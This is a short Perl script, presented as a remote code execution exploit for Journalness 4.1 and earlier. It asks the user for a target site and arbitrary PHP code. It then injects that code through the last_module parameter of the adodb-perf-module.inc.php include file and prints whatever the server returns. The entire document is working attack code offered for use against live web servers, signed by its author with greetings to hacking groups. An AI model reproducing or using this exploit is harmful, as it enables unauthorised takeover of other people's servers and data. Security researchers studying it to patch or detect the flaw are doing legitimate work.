#!/usr/bin/perl
#
#	Vendor url: journalness.sourceforge.net
#
# note: exploit requires Register_globals = On in php.ini
#							~Iron
#							http://www.randombase.com
require LWP::UserAgent;

print "#
# Journalness <= 4.1 Remote Code Execution exploit
# By Iron - randombase.com
# Greets to everyone at RootShell Security Group & dHack
#
# Example target url: http://www.target.com/journalnessdir/
Target url?";
chomp($target=<stdin>);
if($target !~ /^http:\/\//)
{
	$target = "http://".$target;
}
if($target !~ /\/$/)
{
	$target .= "/";
}
print "PHP code to evaluate? ";
chomp($code=<stdin>);
$code =~ s/(<\?php|\?>|<\?)//ig;
$target .= "includes/database/adodb-perf-module.inc.php?last_module=t{};%20class%20t{};".$code."//";

$ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->env_proxy;

$response = $ua->get($target);

if ($response->is_success)
{
	print "\n"."#" x 20 ."\n";
	print $response->content;
	print "\n"."#" x 20 ."\n";
}
else
{
 die "Error: ".$response->status_line;
}


